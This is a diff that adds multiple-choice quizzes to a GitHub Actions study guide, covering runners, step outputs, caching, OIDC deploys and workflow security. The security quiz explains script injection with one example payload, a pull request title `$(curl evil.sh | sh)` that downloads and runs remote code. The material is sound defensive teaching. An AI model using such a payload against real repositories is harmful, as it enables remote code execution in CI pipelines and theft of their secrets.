@@ -103,6 +103,29 @@ If you remember one thing from Part 1: the runner starts empty and disappears wh
 
 Throughout the early chapters you'll see actions referenced by a version tag, like `actions/checkout@v4`, because it reads cleanly while you're learning. In production you should pin third-party actions to a full commit SHA instead — tags are mutable and that has real security consequences. [Part 7](#part-7--security-hardening) explains exactly why and how; until then, the `@v4` style keeps examples readable.
 
+```quiz
+Q: Job A writes a file to disk, then Job B (with no `needs:` relationship) tries to read it. What happens?
+- [ ] Job B reads the file — jobs in a workflow share a filesystem
+- [x] Job B can't see the file — each job gets a fresh, ephemeral runner
+- [ ] Job B reads the file only if both use `ubuntu-latest`
+- [ ] Job B waits for Job A, then reads the file
+> Each job runs on its own clean runner that is wiped when the job ends, so nothing written to disk in one job is visible to another. To move data between jobs you must use artifacts or job outputs; only *steps within a single job* share a filesystem and persist state to each other.
+
+Q: A new workflow checks out nothing and immediately runs `cat README.md`, which fails with "no such file." Why?
+- [ ] The runner image doesn't include `cat`
+- [ ] `README.md` must be uppercase in the workflow
+- [x] A fresh runner starts empty — your code isn't present until `actions/checkout` runs
+- [ ] The default branch wasn't pushed yet
+> The runner is a brand-new VM with none of your repository on it. The `actions/checkout` action is what clones your code onto the runner, which is why forgetting it is one of the most common early mistakes. Tools and code only exist on the runner because a step put them there.
+
+Q: Within a single job, two steps run `npm install` then `npm test`. Does the second step see the installed packages?
+- [x] Yes — steps in a job share the same runner, filesystem, and persist state in order
+- [ ] No — each step gets a fresh environment
+- [ ] Only if you upload an artifact between them
+- [ ] Only if `needs:` links them
+> Steps within one job execute sequentially on the same runner and share the filesystem, checked-out code, and installed tools — that's exactly why setup-then-use works step to step. The ephemeral, isolated boundary is the *job*, not the step; `needs:` and artifacts are for crossing that job boundary.
+```
+
 ---
 
 ## Part 2 — The Workflow Language
@@ -292,6 +315,29 @@ permissions:
 ```
 
 Set it restrictively at the workflow level and grant extra scopes only on the jobs that need them. The default scopes, the real risks, and the least-privilege patterns are all in [Part 7](#part-7--security-hardening).
+
+```quiz
+Q: You set `BUILD_ID` with `export BUILD_ID=...` in one `run` step. The next `run` step echoes `$BUILD_ID` and gets nothing. Why?
+- [ ] You must declare it under `env:` first
+- [x] Each `run` is a fresh shell, so a plain `export` doesn't survive to the next step
+- [ ] `$GITHUB_ENV` is read-only
+- [ ] The variable name must be uppercase
+> Every `run` step launches a new shell, so shell-local exports vanish when the step ends. To persist a value to later steps you append a `name=value` line to the file named by `$GITHUB_ENV`; Actions loads those into the environment of subsequent steps. The same fresh-shell rule is why step *outputs* go through `$GITHUB_OUTPUT` rather than ordinary variables.
+
+Q: A scheduled workflow you edited on a feature branch isn't picking up your cron change. What's the likely cause?
+- [ ] Cron requires `workflow_dispatch` to also be set
+- [ ] Schedules are disabled on private repos
+- [x] Scheduled runs always use the workflow file from the default branch
+- [ ] The cron expression must be in local time, not UTC
+> `schedule:` triggers run against the default branch's copy of the workflow, so a cron change on a feature branch won't take effect until it's merged. Cron is also always in UTC and may be delayed under load, so it's the wrong tool for anything needing exact timing.
+
+Q: What's the difference between writing to `$GITHUB_OUTPUT` versus `$GITHUB_ENV` in a step?
+- [ ] Nothing — they're aliases
+- [x] `$GITHUB_OUTPUT` exposes a named value via the `steps.<id>.outputs` context; `$GITHUB_ENV` sets an environment variable for later steps
+- [ ] `$GITHUB_OUTPUT` is for jobs, `$GITHUB_ENV` is for the whole workflow
+- [ ] `$GITHUB_ENV` is encrypted, `$GITHUB_OUTPUT` is not
+> Both files persist data past the fresh-shell boundary, but they surface it differently. `$GITHUB_OUTPUT` defines a structured output read as `steps.<id>.outputs.<name>` (and promotable to a job output), while `$GITHUB_ENV` injects a plain environment variable into the shells of subsequent steps. Reach for outputs when you want named, referenceable values and env when you just need a variable in scope.
+```
 
 ---
 
@@ -506,6 +552,29 @@ jobs:
 ```
 
 The health checks are not optional in practice: without them, your tests can start before the database accepts connections and fail intermittently — one of the most common flaky-CI causes. For what to actually exercise behind these connections, see the [Postgres guide](POSTGRES.md) and [Redis guide](REDIS_STUDY_GUIDE.md).
+
+```quiz
+Q: Why does keying a cache with `${{ runner.os }}-pip-${{ hashFiles('requirements.txt') }}` give correct behavior across dependency changes?
+- [ ] `hashFiles()` re-runs the install to validate the cache
+- [x] The key changes exactly when the lockfile changes, so unchanged deps hit and changed deps force a fresh save
+- [ ] It encrypts the cache per commit
+- [ ] It makes the cache mutable so it can be overwritten in place
+> `hashFiles()` produces a content hash of the lockfile, so the key is stable while dependencies are stable (cache hit) and changes the moment they do (new key → fresh save). This matters because cache keys are immutable — you can't overwrite one — so the key itself must encode the dependency set. `restore-keys` prefixes then let a near-miss restore a warm-but-stale cache instead of starting cold.
+
+Q: A matrix has `fail-fast: false`. One combo (Windows + Node 18) fails. What happens to the others?
+- [ ] They're all cancelled immediately
+- [x] They keep running, so you get every combo's pass/fail result
+- [ ] Only combos on the same OS are cancelled
+- [ ] The whole workflow is marked cancelled
+> `fail-fast: true` (the default) cancels the remaining combinations the instant one fails — fast feedback at the cost of the full picture. Setting it `false` lets every combination finish, which is what you want when diagnosing "does this break only on one OS/version?" The trade is more runner minutes spent on combos you already suspect will fail.
+
+Q: You need to pass a build artifact (a compiled binary) and a version string from a build job to a deploy job. Which pairing is idiomatic?
+- [ ] Both as job outputs
+- [ ] Both as artifacts
+- [x] The binary as an artifact, the version string as a job output
+- [ ] Write both to `$GITHUB_ENV`
+> The rule of thumb is "a file → artifact, a string → job output." Artifacts persist actual files across the ephemeral-runner boundary (and are downloadable from the run UI), while job outputs carry small strings exposed via `needs.<job>.outputs.<name>`. Using a job output for a binary or an artifact for a one-line version both fight the intended mechanism.
+```
 
 ---
 
@@ -953,6 +1022,29 @@ jobs:
 
 npm and crates.io follow the same shape: build, then publish with a token in `NODE_AUTH_TOKEN` / `CARGO_REGISTRY_TOKEN` (npm now also supports OIDC trusted publishing). And when you create a GitHub **Release**, it can [auto-generate release notes](https://docs.github.com/en/actions/publishing-packages) from merged PRs — a changelog for free.
 
+```quiz
+Q: What is the core security improvement of OIDC over storing a long-lived cloud access key as a secret?
+- [ ] OIDC tokens are longer and harder to brute-force
+- [x] Nothing long-lived is stored — the run exchanges a short-lived signed token for short-lived cloud credentials
+- [ ] OIDC encrypts the secret at rest instead of in transit
+- [ ] OIDC lets fork PRs deploy safely
+> With OIDC, GitHub mints a short-lived signed token describing the run (repo, branch, environment) and your cloud is configured to trust GitHub's provider and exchange it for ephemeral credentials. There's no static key sitting in your secrets to leak, rotate, or have exfiltrated. A leaked OIDC token is also useless minutes later and only valid for the narrowly-scoped trust you configured.
+
+Q: An OIDC deploy job fails with "unable to request the OIDC token." Which workflow setting is most likely missing?
+- [ ] `contents: write`
+- [ ] `environment: production`
+- [x] `permissions: id-token: write`
+- [ ] `fail-fast: false`
+> Requesting the OIDC token requires the `id-token: write` permission scope; without it the run simply can't ask GitHub for the token, no matter how the cloud trust is set up. Everything else (contents read, the auth action, the IAM trust policy) is downstream of first being allowed to obtain the token.
+
+Q: What does binding a job to a `production` environment with required reviewers actually enforce?
+- [ ] It encrypts the job's logs
+- [ ] It runs the job on a self-hosted runner
+- [x] The job pauses until a named person/team approves, and can be restricted to specific branches with its own scoped secrets
+- [ ] It automatically rolls back on failure
+> A deployment environment attaches protection rules to a named target: required reviewers pause the job for manual approval (your enforced production gate), deployment-branch rules restrict which branches may deploy, and environment-scoped secrets let `secrets.API_KEY` resolve to different values for staging vs production. It's GitHub-enforced governance around the deploy, not anything about how the deploy itself executes.
+```
+
 ---
 
 ## Part 7 — Security Hardening
@@ -1077,6 +1169,29 @@ Rounding out the defenses ([security hardening](https://docs.github.com/en/actio
 - **Restrict which actions can run.** Org/repo settings can limit `uses:` to GitHub-authored and verified-creator actions, or an explicit allowlist — a strong supply-chain control.
 - **Attest your builds.** `actions/attest-build-provenance` produces signed provenance for your artifacts and images, so downstream consumers can verify what built them.
 - **Audit third-party actions** before adopting: read the source at the SHA you pin, prefer verified publishers, and remember that a *transitive* action (one your action depends on) inherits the same access.
+
+```quiz
+Q: Why is checking out and running a fork PR's code under `pull_request_target` the classic footgun?
+- [ ] It doubles the runner cost
+- [ ] It bypasses required reviewers
+- [x] `pull_request_target` runs with your secrets and a write token, so executing untrusted PR code hands an attacker both
+- [ ] It always fails because forks can't be checked out
+> `pull_request` from a fork is safe by design — read-only token, no secrets — which is why it's the right trigger for building and testing fork code. `pull_request_target` exists for trusted, code-free tasks (labeling, commenting) and deliberately runs in the base repo's privileged context. The moment you check out and run the PR's head code under it, a stranger's code executes with your secrets and a writable token. If a fork genuinely needs secrets, gate it behind an environment with a required reviewer.
+
+Q: A workflow does `run: echo "Title: ${{ github.event.pull_request.title }}"`. Why is binding the value to an `env:` var instead the fix?
+- [ ] env vars are encrypted and `${{ }}` is not
+- [x] `${{ }}` is substituted into the script before the shell runs, so a crafted title becomes executable code; an env var is expanded by the shell as plain data
+- [ ] env vars are faster to evaluate
+- [ ] It avoids masking the title in logs
+> Context expressions are interpolated into the `run` block *before* the shell executes, so a PR titled `$(curl evil.sh | sh)` becomes a command, not a string — remote code execution. Routing the value through `env:` means the shell expands `$TITLE` at runtime as ordinary data it never interprets. Any outsider-controlled value (titles, branch names, issue bodies) must go through env, never straight into the script.
+
+Q: Why pin a third-party action to a full commit SHA rather than `@v3`?
+- [ ] SHAs run faster than tags
+- [ ] Tags don't support Dependabot
+- [x] Tags are mutable — the action's owner can repoint `v3` onto malicious code — while a SHA is immutable
+- [ ] SHAs automatically get the latest features
+> A tag like `v3` is just a movable pointer; whoever controls the action's repo can move it onto new (or hostile) code, and every workflow on `@v3` runs that code on its next execution — and it runs with *your* job's privileges. A 40-character SHA can't be silently repointed, so it freezes exactly the code you audited. Dependabot then bumps those SHAs on a schedule so they don't go stale.
+```
 
 ---
 
